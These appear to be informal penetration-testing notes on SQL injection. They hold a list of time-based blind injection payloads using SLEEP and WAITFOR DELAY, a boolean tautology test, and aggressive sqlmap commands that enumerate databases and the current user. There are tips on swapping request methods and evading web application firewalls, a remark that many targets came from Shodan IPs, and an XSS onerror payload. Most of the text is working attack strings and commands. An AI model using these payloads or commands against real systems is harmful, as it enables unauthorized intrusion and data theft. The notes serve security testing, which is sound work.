One of the best ways to confirm a SQL injection is by making it operate a logical operation and having the expected results.

For example: if the GET parameter ?username=Peter returns the same content as ?username=Peter' or '1'='1 then, you found a SQL injection.


```
orwa' AND (SELECT 6377 FROM (SELECT(SLEEP(5)))hLTl)--
(SlEeP%09(14-(5-2)))
')) or sleep(5)=' 
;waitfor delay '0:0:5'-- 
);waitfor delay '0:0:5'-- 
';waitfor delay '0:0:5'-- 
";waitfor delay '0:0:5'-- 
');waitfor delay '0:0:5'-- 
");waitfor delay '0:0:5'-- 
));waitfor delay '0:0:5'-- 
```


sqlmap -r request.txt -p parameter-name --force-ssl --level 5 --risk 3  --dbs --hostname --current-user

90% from my finds in SQL injection as
 [POST Request] 
1 Login page in username parameter 
2 Forget password page username parameter
3 Singup Page firstname and last name parameter

' WAITFOR DELAY '0:0:5'-- 
';WAITFOR DELAY '0:0:5'-- 
===>Comment

If sometimes you cant exploits  
change request form POST to GET 
if the same with the url injection try change request form GET to POST



most modern web apps use WAF & user input validation before execute it.
yeh 
you can try with 
--random-agent 
but i dont remember that i use tempers 

or maby because lot of these sql i found it from shodan ips




all the time i try Sql  in user parameter 
1)
i used sleep payload
`';WAITFOR DELAY '0:0:5'-- `
and the server get DELAY for 5 s
2)
save Post request in txt
```
sqlmap -r txt -p user --force-ssl --level 5 --risk 3
sqlmap -r request.txt -p email/username --force-ssl -level 5 --risk 3 --dbms="MySQL" --test-filter="MySQL >= 5.0.12 AND time-based blind (query SLEEP)"
```
```
"><img src=x onerror=alert(document.domain)>
--sleep(15).png
--sleep(6*3).png
--sleep(25).png
--sleep(5*7).png
```
